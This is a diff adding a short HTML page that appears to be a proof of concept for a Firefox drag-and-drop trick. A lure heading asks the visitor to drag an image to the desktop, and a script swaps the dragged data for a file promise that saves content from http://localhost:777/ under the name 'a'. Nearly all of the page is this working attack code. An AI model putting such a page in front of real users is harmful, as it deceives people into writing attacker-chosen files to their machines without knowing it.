@@ -1,0 +1,10 @@
+<h3>Drag and drop the following image to your desktop (or any other folder)</h3>
+<img src="http://i.imgur.com/0PhK7.png" id="qimg"/>
+<script>
+
+
+qimg.ondragstart=function(ev){
+	ev.dataTransfer.setData('application/x-moz-file-promise-dest-filename',"a");
+	ev.dataTransfer.setData('application/x-moz-file-promise-url','http://localhost:777/');
+}
+</script>
